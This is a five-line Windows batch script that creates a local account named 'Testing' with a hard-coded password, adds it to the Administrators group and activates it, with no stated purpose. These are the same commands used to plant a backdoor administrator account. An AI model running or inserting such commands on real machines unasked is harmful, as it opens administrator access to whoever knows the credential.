@echo off

net user "Testing" "Test2023!" /add
net localgroup "Administrators" "Testing" /add
Net user Testing /active:yes
